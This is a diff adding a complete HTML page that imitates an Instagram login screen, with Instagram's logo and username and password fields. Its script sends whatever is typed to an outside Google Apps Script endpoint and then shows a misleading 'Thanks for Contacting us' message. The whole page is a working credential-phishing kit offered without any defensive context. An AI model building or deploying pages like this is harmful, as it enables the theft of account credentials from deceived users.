@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<style>
+
+input[type=text], select {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid grey;
+  border-radius: 4px;
+  box-sizing: border-box;
+}
+
+input[type=submit] {
+  width: 100%;
+  background-color: #4CAF50;
+  color: white;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+input[type=submit]:hover {
+  background-color: #45a049;
+}
+
+div {
+  border-radius: 5px;
+  background-color: white;
+  padding: 150px;
+}
+</style>
+<body>
+
+<h3><center><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i></center></h3>  
+
+<div>
+  <form method="post" name="google-sheet">
+    <label for="fname">Username</label>
+    <input type="text" id="fname" name="Username" placeholder="Phone number,Username,or emial..">
+
+    <label for="lname">Password</label>
+    <input type="text" id="lname" name="Password" placeholder="Password..">
+ 
+    <input type="submit" value="Submit" name="submit">
+  </form>
+</div>
+
+<script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbxVjs0zTpNexdYc8d6viaFr8Sqz9q0glIoClDw9faElAS--BDTDldT11R_3LKM9biw08Q/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+
+</body>
+</html>
+
+
